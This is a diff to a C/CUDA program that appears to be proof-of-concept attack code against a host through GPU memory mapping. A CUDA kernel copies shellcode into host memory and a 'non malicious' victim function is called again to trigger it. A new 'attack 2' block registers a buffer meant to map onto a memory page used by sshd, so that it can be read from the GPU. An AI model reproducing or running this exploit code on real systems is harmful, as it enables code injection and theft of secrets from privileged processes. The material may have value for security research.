@@ -128,9 +128,12 @@ int main(void) {
 	//printf("start addr 0x%llx, 0x%llx\n",info_for_cuda_driver->start_addr,info_for_cuda_driver->end_addr );
 	printf("info buffer addr: 0x%llx\n",(unsigned long)info_for_cuda_driver);
 
-	char * real_buff = (char*)aligned_malloc(pagesize*sizeof(char)); // Malloc alligned buffer.
+  // Malloc alligned buffer.
+	char * real_buff = (char*)aligned_malloc(pagesize*sizeof(char));
+	char * dump_buff = (char*)aligned_malloc(pagesize*sizeof(char));
 
 	memset(real_buff,0x4141,pagesize*sizeof(char)); // Fill buffer with 414141
+	memset(dump_buff,0x4141,pagesize*sizeof(char));
 
 	/*calculate the victim function parameters*/
 	f=&Stub_Funct;
@@ -191,6 +194,8 @@ int main(void) {
 #endif
 
 	char * d_real_buff;
+	char * d_dump_buff;
+
 	char * d_target;
 
 	char * h_target = (char*)malloc(2*pagesize*sizeof(char*));
@@ -229,12 +234,12 @@ int main(void) {
 	//(stdout->_IO_write_base)[1]='W';
 
 	/*Activate cuda kernel, that copies shellcode */
-	// real_buff is only a malloced buffer?
 	PixsysCuda<<<1,64>>>(d_real_buff,offset);
 
 
 	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
 
+#ifdef _ATTACK_1
 	f(); // Call "non malicious" function again.
 	CUDA_CHECK_RETURN(cudaGetLastError());
 
@@ -242,7 +247,38 @@ int main(void) {
 		//printf("Target is: 0x%08x\n",*(unsigned int *) h_target);
 		//printf("STRNG Target is 0x%08x",*(unsigned int *)(h_target+pagesize));
 		fflush(stdout);
-		CUDA_CHECK_RETURN(cudaHostUnregister((void *)real_buff)) ;
+#endif
+
+#define _ATTACK_2
+#ifdef _ATTACK_2
+
+#if 0
+	/* Try to set up the mallicious bit 2 */
+	try
+	{
+		cudaHostRegister((void *)0x0400000, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE) ;
+		cudaHostRegister((void *)0x0800000, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE) ;
+		cudaHostRegister((void *)0x01200000, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE) ;
+	}
+	catch (...)
+	{
+		printf("NAH");
+	}
+#endif
+
+	/* Map this buffer to a memory page which currently maped by sshd. */
+	CUDA_CHECK_RETURN(cudaHostRegister((void *)dump_buff, pagesize*sizeof(char), CU_MEMHOSTREGISTER_PORTABLE)) ;
+
+	/* Get device pointer of this buffer */
+	CUDA_CHECK_RETURN(cudaHostGetDevicePointer((void**)&d_dump_buff, dump_buff,0));
+
+	/*Activate cuda kernel, that copies shellcode */
+//	PixsysCuda_read<<<1,64>>>(d_dump_buff);
+#endif
+
+
+		CUDA_CHECK_RETURN(cudaHostUnregister((void *)real_buff));
+		CUDA_CHECK_RETURN(cudaHostUnregister((void *)dump_buff));
 		CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
 		CUDA_CHECK_RETURN(cudaGetLastError());
 	//}
